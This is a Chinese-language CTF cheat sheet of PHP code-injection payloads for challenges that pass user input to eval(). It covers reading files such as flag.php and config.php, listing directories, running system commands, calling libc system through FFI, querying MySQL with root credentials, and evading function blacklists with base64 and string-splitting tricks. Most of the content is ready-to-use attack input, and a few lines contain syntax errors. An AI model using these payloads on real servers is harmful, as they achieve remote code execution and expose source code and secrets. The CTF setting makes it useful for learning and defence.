在线php运行：<https://www.jyshare.com/compile/1/>



## **php常见特殊函数和绕过**
**文件包含函数 绕过一些禁用函数**
如果是eval($_POST('c'))，直接蚁剑连，用插件绕过
```
c=highlight_file("config.php");        //文件内容包含高亮。
c=show_source('flag.php');
c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));
c=print_r(scandir(dirname('__FILE__')));
// ( [0] => 。 [1] => .. [2] => flag.php [3] => index.php ) 
c=var_dump(file('flag.php'));
c=readfile('flag.php');
c=print_r(file('flag.php'));
c=show_source(file(''flag.php));
c=echo file_get_contents('flag.php');
c=include('/flag.txt');
c=require('/flag.txt');
c=require_once('/flag.txt');

c=try {$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root','root');foreach($dbh->query('select load_file("/flag36.txt")') as $row){echo($row[0])."|"; }$dbh = null;}catch (PDOException $e) {echo $e->getMessage();exit(0);}exit(0);

```
查目录
```
c=var_dump(scandir('/'));

c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");}//glob的作用是规定后面的匹配格式，查找匹配的文件路径模式

c=$a=scandir("/");foreach($a as $key=>$value){echo $key."=>".$value;}

c=var_export(scandir('/'));exit(); 
//停掉后面的限制函数如ob_end_clean()会清除缓冲不会输出内容。会输出很多???????????
c=include('/flag.txt');die();
```
```
print_r(file_get_contents(/flagg')); //打印获取文件的内容
var_dump(scandir(/);  //查看根目录
var_dump(scandir(chr(47))); //查看根目录

var_dump(file_get_contents(/flagg')); //打印获取文件的内容。file_get_content()也可以读取php://filter伪协议。
var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));  //绕过打印flag
```

根目录下有/readflag程序
```
c=$ffi = FFI::cdef("int system(char *command);", "libc.so.6");$a='/readflag > 1.txt';$ffi->system($a);exit();
然后访问ip/1.txt
```


^
## **代码执行函数**
eval('system('cat /flag'); ');         //会将字符串当作PHP代码执行，注意分号。
eval('system('cat /flag')?> ');    // 分号可以用?>替换。 且后面代码也会正常执行。

```
对于eval($_GET('c'));题

/?c=eval($_GET[a]);&a=system('cat flag.php');  //绕过eval有限制。
/?c=eval($_GET[a])?>&a=system('cat flag.php');  //绕过eval有限制。过滤了;
eval('eval($_GET[a])?>')  

/?c=include"$_GET[a]"?>&a=php://filter/read=convert.base64-encode/resource=flag.php //过滤了(
/?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php //过滤了( 双引号"
```
eval("$x='sys';  $y='tem';  $z=$x.$y;  $z('cat config.php');" );         //绕过过滤。

eval('base64_decode("c3lzdGVt");$b=base64_decode("Y2F0IGNvbmZpZy5waHA=");$a($b);');        //base64编码绕过。

assert()可以将整个字符串参数当作php参数执行
而类似的eval()函数是执行合法的php代码，eval()里的引号必须是双引号，因为单引号不能解析字符串里的变量$str，且必须以分号结尾，函数调用除外。
```
<?php
echo eval(echo 1);
?>
不行，需改成下面：
<?php
echo eval("echo 1;");
?>
```


^
^
当前目录文件全部看cat *
命令执行找flag文件：find / -name flag*
递归搜当前目录下内容：grep -r "flag{" .

php内的"\"在做代码执行的时候，会识别特殊字符串，绕过黑名单。
如\system

